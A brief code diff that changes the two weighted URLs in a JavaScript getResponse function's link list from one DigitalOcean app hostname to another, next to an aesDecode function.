@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://seahorse-app-bwgie.ondigitalocean.app/", weight: 0.5 },
-        { url: "https://seahorse-app-bwgie.ondigitalocean.app/", weight: 0.5 }
+        { url: "https://sea-lion-app-idpba.ondigitalocean.app/", weight: 0.5 },
+        { url: "https://sea-lion-app-idpba.ondigitalocean.app/", weight: 0.5 }
       
     ];
 
